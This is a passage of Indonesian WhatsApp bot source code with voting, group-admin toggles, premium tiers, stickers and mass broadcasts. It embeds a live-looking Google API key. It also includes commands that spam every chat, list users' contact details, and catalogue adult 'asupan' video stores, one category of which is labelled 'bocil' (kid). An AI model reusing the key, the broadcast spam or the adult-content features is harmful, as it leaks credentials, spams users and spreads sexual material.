
*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿??𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: dica.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            dica.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: dica.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            dica.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${dica.user.id}
`
dica.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await dica.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`*Sukses Menutup Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await dica.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`*Sukses Membuka Group*`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
                        { buttonId: 'group open', buttonText: { displayText: 'Open kh?' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close kh?' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, `Mode Group`, dica.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await dica.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`*Sukses Membuka Edit Info Group*`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await dica.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`*Sukses Menutup Edit Info Group*`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open kh?' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close kh?' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, `Mode Edit Info`, dica.user.name, m)

            }
            }
            break
case 'autovn': {
	if (!isPremium) throw mess.premime
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].autovn) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].autovn = true
m.reply(`Autovn Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].autovn) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].autovn = false
m.reply(`Autovn Tidak Aktif !`)
} else {
let buttons = [
{ buttonId: 'autovn on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'autovn off', buttonText: { displayText: 'Off' }, type: 1 }
]
await dica.sendButtonText(m.chat, buttons, `Mode Autovn`, dica.user.name, m)
  }
}
break
case 'antilink': {
	if (!isPremium) throw mess.premime
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antilink = true
m.reply(`Antilink Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antilink = false
m.reply(`Antilink Tidak Aktif !`)
} else {
let buttons = [
{ buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await dica.sendButtonText(m.chat, buttons, `Mode Antilink`, dica.user.name, m)
  }
}
break
case 'autojoin': {
                if (!itsMeDica) throw mess.owner
                if (args[0] === "on") {
                if (db.data.chats[m.chat].autojoin) return m.reply(`*Sudah Aktif kak Sebelumnya*`)
                db.data.chats[m.chat].autojoin = true
                m.reply(`*Auto Join Sekarang Aktif !*`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].autojoin) return m.reply(`*Sudah Tidak Aktif Sebelumnya*`)
                db.data.chats[m.chat].autojoin = false
                m.reply(`*Auto Join Sekarang Tidak Aktif !*`)
                } else {
                 let buttons = [
                        { buttonId: 'autojoin on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'autojoin off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, `Mode Auto Join`, dica.user.name, m)
                }
             }
             break
case 'antivirtex': 
if (!isPremium) throw mess.premime
                   if (!m.isGroup) return m.reply(mess.group)
                     if (!isBotAdmins && !itsMeDica) return m.reply(mess.botAdmin)
                     if (!isAdmins) return m.reply(mess.admin)
                     if (!q) return m.reply(`Pilih on atau off`)
                     if (args[0].toLowerCase() === 'on'){
                     if (isAntiVirtex) return m.reply(`Udah aktif`)
_antivirtex.push(m.chat)
fs.writeFileSync('./lib/antivirtex.json', JSON.stringify(_antivirtex))
m.reply(`\`\`\`Sukses ✅, Mengaktifkan fitur antivirtex di grup\`\`\` *${groupMetadata.subject}*`)
} else if (args[0].toLowerCase() === 'off'){
let anu = _antivirtex.indexOf(m.chat)
_antivirtex.splice(anu, 1)
fs.writeFileSync('./lib/antivirtex.json', JSON.stringify(_antivirtex))
m.reply(`\`\`\`Sukses ✅, Menonaktifkan fitur antivirtex di grup\`\`\` *${groupMetadata.subject}*`)
} else {
let buttons = [
{ buttonId: 'antivirtex on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antivirtex off', buttonText: { displayText: 'Off' }, type: 1 }
]
await dica.sendButtonText(m.chat, buttons, `Mode Antivirtex`, dica.user.name, m)
  }
  
break
case 'antilinkyoutube': {
	if (!isPremium) throw mess.premime
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinkyt) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antilinkyt = true
m.reply(`Antilink Aktif Youtube !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinkyt) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antilinkyt = false
m.reply(`Antilink Tidak Aktif !`)
} else {
let buttons = [
{ buttonId: 'antilinkyt on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antilinkyt off', buttonText: { displayText: 'Off' }, type: 1 }
]
await dica.sendButtonText(m.chat, buttons, `Mode Antilink Youtube`, dica.user.name, m)
  }
}
break
case 'antilinktiktok': {
	if (!isPremium) throw mess.premime
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinktt) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antilinktt = true
m.reply(`Antilink Aktif Tiktok !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinktt) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antilinktt = false
m.reply(`Antilink Tidak Aktif !`)
} else {
let buttons = [
{ buttonId: 'antilinktt on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antilinktt off', buttonText: { displayText: 'Off' }, type: 1 }
]
await dica.sendButtonText(m.chat, buttons, `Mode Antilink Tiktok`, dica.user.name, m)
  }
}
break
case 'anticall': {
if (!itsMeDica) return replay(mess.owner)
if (args[0] === "on") {
if (db.data.settings[botNumber].anticall) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.settings[botNumber].anticall = true
m.reply(`Anticall Berhasil Di Aktifkan !`)
} else if (args[0] === "off") {
if (!db.data.settings[botNumber].anticall) return m.reply(`Sudah Nonaktif Sebelumnya`)
db.data.settings[botNumber].anticall = false
m.reply(`Anticall Berhasil Di Nonaktifkan !`)
} else {
let buttonsanticall = [
{ buttonId: `${command} on`, buttonText: { displayText: 'Enable' }, type: 1 },
{ buttonId: `${command} off`, buttonText: { displayText: 'Disable' }, type: 1 }
]
await dica.sendButtonText(m.chat, buttonsanticall, `Mode ${command} 🕊️`, `Silahkan Klik Button Dibawah, Jika Button Tidak Muncul Ketik ${command} on/off`, m)
}
}
break
case 'antilinkinstagram': {
	if (!isPremium) throw mess.premime
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinkig) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antilinkig = true
m.reply(`Antilink Aktif Instagram !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinkig) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antilinkig = false
m.reply(`Antilink Instagram Tidak Aktif !`)
} else {
let buttons = [
{ buttonId: 'antilinkig on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antilinkig off', buttonText: { displayText: 'Off' }, type: 1 }
]
await dica.sendButtonText(m.chat, buttons, `Mode Antilink Instagram`, dica.user.name, m)
  }
}
break
case 'autorespon': {
if (!itsMeDica) throw mess.group
if (args[0] === "on") {
if (db.data.chats[m.chat].simi) return m.reply(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].simi = true
m.reply(`Autorespon Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].simi) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].simi = false
m.reply(`Autorespon Tidak Aktif !`)
} else {
let buttons = [
{ buttonId: 'autorespon on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'autorespon off', buttonText: { displayText: 'Off' }, type: 1 }
]
await dica.sendButtonText(m.chat, buttons, `Mode Autorespon`, dica.user.name, m)
  }
}
break
case 'goblokcek': case 'jelekcek': case 'rate':case 'haram':case 'gaycek':
case 'lesbicek':case 'gantengcek': case 'cantikcek':case 'begocek': case 'suhucek': case 'pintercek':
case 'jagocek':case 'nolepcek':case 'babicek':case 'bebancek':case 'baikcek':
case 'jahatcek':case 'anjingcek':case 'haramcek':case 'pakboycek':
case 'pakgirlcek':case 'sangecek': case 'bapercek':case 'fakboycek':case 'alimcek':case 'suhucek':
case 'fakgirlcek':case 'kerencek':case 'wibucek':case 'pasarkascek':
cantik = body.slice(1)
const eyy =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const yn = eyy[Math.floor(Math.random() * eyy.length)]
dica.sendMessage(m.chat, { text: yn }, { quoted: m })
break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${dica.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${dica.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await dica.sendButtonText(m.chat, buttons, `Mute Bot`, dica.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await dica.groupInviteCode(m.chat)
                dica.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\n👾Link Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await dica.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await dica.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                dica.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'report': case 'lapor': {
            	if (!text) throw `Contoh : ${prefix + command} Lapor Ada Fitur Yang error`
               let ownernya = ownernomer + '@s.whatsapp.net'
               let me = m.sender
               let pjtxt = `Pesan Dari : @${me.split('@')[0]} \nUntuk : @${ownernya.split('@')[0]}\n\n${text}`
               let ments = [ownernya, me]
               let buttons = [{ buttonId: 'hehe', buttonText: { displayText: 'Makasih Laporannya :/' }, type: 1 }]
            await dica.sendButtonText('6281238996370@s.whatsapp.net', buttons, pjtxt, nyoutube, m, {mentions: ments})
            let akhji = `Laporan Anda Telah Terkirim Ke Owner @${ownernya.split('@')[0]}\n*Terima Kasih Atas Laporannya🙏*\n_(Nomermu Akan Terblokir Jika Laporan Hanya Di Buat Buat)_`
            await dica.sendButtonText(m.chat, buttons, akhji, nyoutube, m, {mentions: ments})
            }
            break
            case 'bcgc': case 'bcgroup': {
    
if (!isPremium) throw mess.premime
if (!text) throw `Text mana?`
let getGroups = await dica.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
let txt = `${text}`
let buttons = [{ buttonId: 'store', buttonText: { displayText: '👥OWNER' }, type: 1 }]
await dica.sendButtonText(i, buttons, txt, nyoutube, m )
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bc': case 'broadcast': case 'bcall': {
var fdoc = { key : { remoteJid: 'status@broadcast', participant : '0@s.whatsapp.net' }, message: { documentMessage: { title: 'B R O A D C A S T', jpegThumbnail: global.thumb, }}}
if (!itsMeDica && !m.key.fromMe) return m.reply(mess.owner)
let anu = await store.chats.all().map(v => v.id)
m.reply(mess.wait + '\nMohon Untuk Menunggu Sejenak')
for (let yoi of anu) {
if (/image/.test(mime)) {
await sleep(1500)
var txtbc = `*Broadcast ${dica.user.name}*\n\n*✉️ Message :* ${q? q : ''}\n`
var btnbc = [{ buttonId: `y`, buttonText: { displayText: `${global.ownerName}` }, type: 1 }]
let media = await dica.downloadAndSaveMediaMessage(quoted)
let url = await TelegraPh(media)
let urll = await getBuffer(url)
dica.sendMessage(yoi, { image: urll, caption: txtbc, buttons: btnbc }, { quoted: fdoc })
if (fs.existsSync(media)) fs.unlinkSync(media)
} else if (/video/.test(mime)) {
await sleep(1500)
var txtbc = `*Broadcast Kilaaa*\n\n*✉️ Message :* ${q? q : ''}\n`
var btnbc = [{ buttonId: `y`, buttonText: { displayText: `${global.ownerName}` }, type: 1 }]
let media = await dica.downloadAndSaveMediaMessage(quoted)
let url = await TelegraPh(media)
let urll = await getBuffer(url)
dica.sendMessage(yoi, { video: urll, caption: txtbc, buttons: btnbc }, { quoted: fdoc })
if (fs.existsSync(media)) fs.unlinkSync(media)
} else if (/audio/.test(mime)) {
let media = await dica.downloadAndSaveMediaMessage(quoted)
await sleep(1500)
let urll = await UploadFileUgu(media)
dica.sendMessage(yoi, { audio: { url: urll.url }}, { quoted: fdoc })
} else {
await sleep(1500)
var txtbc = `*Broadcast Kilaaa*\n\n*✉️ Message :* ${q? q : ''}\n`
var btnbc = [{ buttonId: `owner`, buttonText: { displayText: `OWNER` }, type: 1 }]
await dica.sendButtonText(yoi, btnbc, txtbc, '', fdoc)
}
m.reply('Sukses Broadcast')
}
}
break
case 'bcloc': {
const Jimp = require('jimp')
const reSize = (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await Jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(Jimp.MIME_JPEG)
        resolve(ab)
    })
}
buffer = global.dicabc
if (!itsMeDica) return replay(mess.owner)
                if (!text) return m.reply(`Use ${prefix}bcloc text\n\nContoh : ${prefix + command} attention everybody`)
                let anu = await store.chats.all().map(v => v.id)
                let [melo, melo2] = text.split`|`
                m.reply(`*Send Broadcast To* ${anu.length} Chat\nTime ${anu.length * 1.5} sec`)
	     	for (let yoi of anu) {
	     	await sleep(1500)
		    var button = [{ buttonId: `owner`, buttonText: { displayText: `OWNER` }, type: 1 }, { buttonId: `DONASI`, buttonText: { displayText: `DONASI` }, type: 1 }]             
            dica.sendMessage(yoi, { caption: `${melo}`, location: { jpegThumbnail: await reSize(buffer, 200, 200) }, buttons: button, footer: `Kilaaa`, mentions: [m.sender] })
		}		
            }
            break
case 'asupan': {
dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/gelay.mp3`)
            let me = m.sender
            let ownernya = ownernomer + '@s.whatsapp.net'
            let ments = [ownernya, me, ini_mark]
            let kukiw = `Hai Kak ${pushname}\nButuh Asupan yah🤭`
            let linit = `Limit lu:  ` + (db.data.users[m.sender].limit)
                let sections = [
                {
                	title: "Klik Limit kak, supaya infinity ",
	           rows: [
	            {title: "〽️│➵Limit", rowId: `listsewa`, description: `KLIK UNTUK BUY LIMIT`},
                {title: "🔞│➵Video", rowId: `video`, description: `INGET LIMIT BRO`},
                {title: "🔞│➵Foto", rowId: `foto`, description: `DOSA TANGGUNG SENDIRI`}
    ]
  },
]
                dica.sendListMsg(m.chat, kukiw, linit, `Di sini Tempatnya Asupan⚠️`, `Klik Asupan`, sections, m)
await dica.sendMessage(m.chat, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true })
}
break

            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await dica.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 dica.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await dica.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 dica.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    dica.sendText(m.chat, 'List Online:\n\n' + online.map(v => '• @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'stiker': case 'sticker': case 's': case 'stickergif': case 'sgif': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
            if (!quoted) throw `*Balas Video/Image Dengan Caption* ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await dica.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('*Maksimal 10 detik!*')
                let media = await quoted.download()
                let encmedia = await dica.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `*Kirim Gambar/Video Dengan Caption* ${prefix + command}\nDurasi *Video 1-9 Detik*`
                }
            }
            break
            case 'ebinary': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
            if (!text) throw `Contoh : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
            if (!text) throw `Contoh : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
case 'addprem':
				if (!itsMeDica) return m.reply(mess.owner)
				{ q, args } {
				if (args.length < 2)
				return m.reply(
				`Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`
				);
				if (m.mentionedJid.length !== 0) {
				for (let i = 0; i < m.mentionedJid.length; i++) {
				prem.addPremiumUser(m.mentionedJid[0], args[1], premium);
						}
				dica.sendMessage(m.chat, { text: "Sukses Premium" }, { quoted: m });
					} else {
				prem.addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
				dica.sendMessage(m.chat, { text: "Sukses Via Nomor" }, { quoted: m });
						}
					}
				break
			case 'delprem':
				if (!itsMeDica) return m.reply(mess.owner)
				{ q, args, arg } {
				if (args.length < 1) return reply(`Penggunaan :\n*#delprem* @tag\n*#delprem* nomor`);
				if (m.mentionedJid.length !== 0) {
					for (let i = 0; i < m.mentionedJid.length; i++) {
						premium.splice(prem.getPremiumPosition(m.mentionedJid[i], premium), 1);
						fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
					}
					dica.sendMessage(m.chat, { text: "Sukses Delete" }, { quoted: m });
				} else {
				premium.splice(prem.getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
				fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
				dica.sendMessage(m.chat, { text: "Sukses Via Nomer" }, { quoted: m });
				}
				}
				break
		case 'listprem': {
			if (!itsMeDica) return m.reply(mess.owner)
			let data = require("./database/premium.json")
			let txt = `*------「 LIST PREMIUM 」------*\n\n`
                    for (let i of data) {
                txt += `*Nomer : ${i.id}*\n*Expired : ${i.expired} Second*\n\n`
                }
            m.reply(txt)
			}
			break
case 'listvideo': {
	if (!isPremium) throw mess.premime
   
    let asupan = require("./storage/asupan/video/asupan.json")
    let notnot = require("./storage/asupan/video/asupannotnot.json")
    let bocil = require("./storage/asupan/video/bocil.json")
    let bokep = require("./storage/asupan/video/bokep.json")
    let clmk = require("./storage/asupan/video/clmk.json")
    let ghea = require("./storage/asupan/video/gheayubi.json")
    let kayes = require("./storage/asupan/video/kayes.json")
    let rika = require("./storage/asupan/video/rikagusriani.json")
    let santuy = require("./storage/asupan/video/santuy.json")
    let ukhty = require("./storage/asupan/video/ukhty.json")
    let angel = require("./storage/asupan/video/vidangelchan.json")
  //  let aviva = require("./storage/asupan/video/aviva.json")
    let txt1 = `*------「 Total Video ${asupan.length} 」------*\n\n
Bokep: ${bokep.length}
Clmk: ${clmk.length}
Bocil: ${bocil.length}
Notnot : ${notnot.length}
Ghea: ${ghea.length}
Kayes: ${kayes.length}
Rika:${rika.length}
Santuy: ${santuy.length}
Ukhty: ${ukhty.length}
Angelchan: ${angel.length}
Aviva: kosong
`
    let counter = 0
    for (let i of asupan) {
        counter++
    }
    m.reply(txt1)
    }
    break

case 'listfoto': {
	if (!isPremium) throw mess.premime
    let data1 = require("./storage/asupan/foto/pasupan.json")
    let txt1 = `*------「 ${command} 」------*\nTotal Foto: ${data1.length} \n`
    let counter = 0
    for (let i of data1) {
        counter++
    }
    m.reply(txt1)
    }
    break

            case 'emojimix': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Contoh : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Contoh : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await dica.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	    case 'emojimix2': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit)
db.data.users[m.sender].limit -= 1 
	    if (!text) throw `Contoh : ${prefix + command} 😅`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
		for (let res of anu.results) {
		    let encmedia = await dica.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	      /** case 'attp': {
if (!text) throw `Contoh : ${prefix + command} text`
await dica.sendMedia(m.chat, `https://Kilaaa-apii.herokuapp.com/api/maker/attp?text=${text}`, 'dicabo', 'morou', m, {asSticker: true})
}
break
           case 'ttp': {
if (!text) throw `Contoh : ${prefix + command} text`
await dica.sendMedia(m.chat, `https://Kilaaa-apii.herokuapp.com/api/maker/ttp?text=${text}`, 'dicabo', 'morou', m, {asSticker: true})
}
break **/
	       case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
